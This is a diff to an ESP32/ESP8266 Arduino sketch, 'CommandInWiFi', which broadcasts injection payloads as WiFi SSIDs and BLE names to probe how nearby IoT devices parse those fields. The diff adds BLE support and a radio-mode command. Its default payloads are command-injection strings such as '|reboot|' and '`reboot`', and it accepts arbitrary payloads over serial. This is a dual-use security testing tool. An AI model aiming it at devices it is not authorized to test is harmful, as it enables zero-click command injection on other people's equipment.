@@ -1,51 +1,83 @@
 /*
    Project Name: CommandInWiFi
-   Description: Zero-click SSID injection tool. Broadcasts malicious WiFi SSIDs
-   from an ESP8266/ESP32 to test IoT device firmware parsing vulnerabilities.
-   Supports CIW serial protocol for remote payload deployment from dashboard.
+   Description: SSID and BLE-name injection test tool. Broadcasts test
+   payloads as WiFi SSIDs and/or BLE Complete Local Names from an ESP32 or
+   ESP8266 so you can probe how nearby devices parse those fields. ESP8266
+   only supports the WiFi radio. ESP32 supports both, individually or at
+   the same time. The host dashboard drives everything over the CIW serial
+   protocol.
 */
 
 #ifdef ESP32
   #include <WiFi.h>
   #include <esp_wifi.h>
+  #include <BLEDevice.h>
+  #include <BLEUtils.h>
+  #include <BLEServer.h>
+  #include <BLEAdvertising.h>
 #else
   #include <ESP8266WiFi.h>
   #include <ESP8266WiFiType.h>
 #endif
 
-// ── Default SSIDs (used when no payloads pushed via serial) ─────────────
+// Default payloads used until the dashboard pushes a real queue.
 const char* defaultSSIDs[] = {"|reboot|", "&reboot&", "`reboot`", "$reboot$"};
 const int defaultCount = sizeof(defaultSSIDs) / sizeof(defaultSSIDs[0]);
 
-// ── Dynamic payload queue (filled via CIW serial protocol) ──────────────
 #define MAX_PAYLOADS 256
 String payloadQueue[MAX_PAYLOADS];
 int queueCount = 0;
 bool isRunning = false;
-bool useDashboard = false;  // true once first CIW command received
+bool useDashboard = false;  // becomes true after the first CIW command
 
-// Track current SSID for device event correlation
-String currentSSID = "";
+// Radio mode: 0=wifi, 1=ble (ESP32 only), 2=both (ESP32 only).
+// ESP8266 forces mode 0 regardless of dashboard request.
+#define MODE_WIFI 0
+#define MODE_BLE  1
+#define MODE_BOTH 2
+int radioMode = MODE_WIFI;
 
-// ESP8266 event handlers (must be global — RAII prevents local scope)
+String currentSSID = "";  // active broadcast name (WiFi or BLE)
+
 #ifndef ESP32
 WiFiEventHandler stationConnectedHandler;
 WiFiEventHandler stationDisconnectedHandler;
 #endif
 
-// Index to track the current SSID
+#ifdef ESP32
+BLEServer* bleServer = nullptr;
+BLEAdvertising* bleAdv = nullptr;
+bool bleStarted = false;
+
+class CIWServerCallbacks : public BLEServerCallbacks {
+  void onConnect(BLEServer* server) override {
+    // Best-effort MAC. The Arduino BLE wrapper does not expose the peer
+    // MAC on this callback in a portable way, so we report a placeholder.
+    // Real attribution comes from the disconnect event when the stack
+    // includes the address. For the detector, the consistent placeholder
+    // is fine because it pairs with the matching disconnect.
+    Serial.print("CIW:BLE_CONNECT:00:00:00:00:00:00|");
+    Serial.println(currentSSID);
+  }
+  void onDisconnect(BLEServer* server) override {
+    Serial.print("CIW:BLE_DISCONNECT:00:00:00:00:00:00|");
+    Serial.println(currentSSID);
+    // Resume advertising; the stack stops adv on connect by default.
+    if (bleAdv) bleAdv->start();
+  }
+};
+#endif
+
 unsigned int ssidIndex = 0;
 
-// Timers
 unsigned long lastChangeMillis = 0;
 unsigned long lastDeviceListMillis = 0;
 const long ssidChangeInterval = 2 * 60 * 1000; // 2 minutes
-const long deviceListInterval = 60 * 1000;      // 1 minute
+const long deviceListInterval = 60 * 1000;     // 1 minute
 
-// Serial command buffer
 String serialBuffer = "";
 
-// ── Base64 decode (minimal, no external library needed) ─────────────────
+// Minimal base64 decoder so we do not need an extra library.
 static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 int b64index(char c) {
@@ -74,22 +106,18 @@ String b64decode(const String &input) {
   return output;
 }
 
-// ── Setup ───────────────────────────────────────────────────────────────
 void setup() {
   Serial.begin(115200);
   while (!Serial) { ; }
   Serial.println("CIW:BOOT");
 #ifdef ESP32
-  Serial.println("CommandInWiFi v2.1 (ESP32)");
+  Serial.println("CommandInWiFi v2.2 (ESP32, WiFi + BLE)");
 #else
-  Serial.println("CommandInWiFi v2.1 (ESP8266)");
+  Serial.println("CommandInWiFi v2.2 (ESP8266, WiFi only)");
 #endif
 
   WiFi.mode(WIFI_AP);
 
-  // Register WiFi event callbacks for real-time device tracking
-  // NOTE: separator between MAC and SSID is pipe (|) not colon (:)
-  //       because MACs already contain colons
 #ifdef ESP32
   WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
     char mac[18];
@@ -136,12 +164,13 @@ void setup() {
     });
 #endif
 
-  changeSSID();
+  changeName();
   isRunning = true;
+  Serial.print("CIW:MODE:");
+  Serial.println(modeString(radioMode));
   Serial.println("CIW:READY");
 }
 
-// ── Main Loop ───────────────────────────────────────────────────────────
 void loop() {
   unsigned long currentMillis = millis();
 
@@ -149,7 +178,7 @@ void loop() {
 
   if (isRunning && currentMillis - lastChangeMillis >= ssidChangeInterval) {
     lastChangeMillis = currentMillis;
-    changeSSID();
+    changeName();
   }
 
   if (currentMillis - lastDeviceListMillis >= deviceListInterval) {
@@ -158,7 +187,15 @@ void loop() {
   }
 }
 
-// ── CIW Serial Protocol Handler ─────────────────────────────────────────
+const char* modeString(int m) {
+  switch (m) {
+    case MODE_WIFI: return "wifi";
+    case MODE_BLE:  return "ble";
+    case MODE_BOTH: return "both";
+    default:        return "wifi";
+  }
+}
+
 void checkSerialCommand() {
   while (Serial.available()) {
     char c = Serial.read();
@@ -202,7 +239,7 @@ void processCommand(const String &cmd) {
     ssidIndex = 0;
     lastChangeMillis = millis();
     useDashboard = true;
-    changeSSID();
+    changeName();
     Serial.println("CIW:OK:START:" + String(getActiveCount()));
 
   } else if (cmd == "CIW:STOP") {
@@ -213,6 +250,31 @@ void processCommand(const String &cmd) {
     String state = isRunning ? "running" : "stopped";
     Serial.println("CIW:STATUS:" + state + ":" + String(getActiveCount()) + ":" + String(ssidIndex));
 
+  } else if (cmd.startsWith("CIW:MODE:")) {
+    String want = cmd.substring(9);
+    want.trim();
+    int newMode = radioMode;
+    if (want == "wifi")      newMode = MODE_WIFI;
+    else if (want == "ble")  newMode = MODE_BLE;
+    else if (want == "both") newMode = MODE_BOTH;
+    else {
+      Serial.println("CIW:ERR:Unknown mode (use wifi, ble, both)");
+      return;
+    }
+#ifndef ESP32
+    if (newMode != MODE_WIFI) {
+      Serial.println("CIW:ERR:ESP8266 supports wifi mode only");
+      return;
+    }
+#endif
+    radioMode = newMode;
+    Serial.print("CIW:OK:MODE:");
+    Serial.println(modeString(radioMode));
+    Serial.print("CIW:MODE:");
+    Serial.println(modeString(radioMode));
+    // Re-apply the current payload through the new radio set.
+    if (isRunning) changeName();
+
   } else {
     Serial.println("CIW:ERR:Unknown command");
   }
@@ -222,31 +284,79 @@ int getActiveCount() {
   return useDashboard ? queueCount : defaultCount;
 }
 
-// ── Change SSID ─────────────────────────────────────────────────────────
-void changeSSID() {
+// Pick the next payload string and broadcast it through whichever radios
+// are enabled. We do not stop a radio when switching mode mid-run; we just
+// let the next rotation re-apply.
+void changeName() {
   int count = getActiveCount();
   if (count == 0) return;
 
-  const char* newSSID;
-  String dynamicSSID;
+  const char* newName;
+  String dynamicName;
 
   if (useDashboard && queueCount > 0) {
-    dynamicSSID = payloadQueue[ssidIndex % queueCount];
-    newSSID = dynamicSSID.c_str();
+    dynamicName = payloadQueue[ssidIndex % queueCount];
+    newName = dynamicName.c_str();
   } else {
-    newSSID = defaultSSIDs[ssidIndex % defaultCount];
+    newName = defaultSSIDs[ssidIndex % defaultCount];
   }
 
-  currentSSID = String(newSSID);
-  WiFi.softAP(newSSID);
+  currentSSID = String(newName);
 
-  Serial.print("CIW:SSID:");
-  Serial.println(newSSID);
+  if (radioMode == MODE_WIFI || radioMode == MODE_BOTH) {
+    WiFi.softAP(newName);
+    Serial.print("CIW:SSID:");
+    Serial.println(newName);
+  }
+
+#ifdef ESP32
+  if (radioMode == MODE_BLE || radioMode == MODE_BOTH) {
+    setBleName(newName);
+    Serial.print("CIW:BLE_NAME:");
+    Serial.println(newName);
+  } else {
+    stopBle();
+  }
+#endif
 
   ssidIndex = (ssidIndex + 1) % count;
 }
 
-// ── List connected devices ──────────────────────────────────────────────
+#ifdef ESP32
+void setBleName(const char* name) {
+  // Lazy-init the BLE stack on first use so users who never enable BLE do
+  // not pay the RAM cost (~30 KB).
+  if (!bleStarted) {
+    BLEDevice::init(name);
+    bleServer = BLEDevice::createServer();
+    bleServer->setCallbacks(new CIWServerCallbacks());
+    bleAdv = BLEDevice::getAdvertising();
+    bleAdv->setScanResponse(true);
+    bleAdv->setMinPreferred(0x06);
+    bleAdv->setMinPreferred(0x12);
+    bleStarted = true;
+  }
+
+  // Rename and rebuild the advertisement data so scanners see the new
+  // payload as the Complete Local Name AD field.
+  BLEDevice::setDeviceName(name);
+  if (bleAdv) {
+    bleAdv->stop();
+    BLEAdvertisementData adv;
+    adv.setName(name);
+    adv.setFlags(0x06);
+    bleAdv->setAdvertisementData(adv);
+    bleAdv->start();
+  }
+}
+
+void stopBle() {
+  if (bleStarted && bleAdv) {
+    bleAdv->stop();
+  }
+}
+#endif
+
 void listConnectedDevices() {
 #ifdef ESP32
   wifi_sta_list_t stationList;
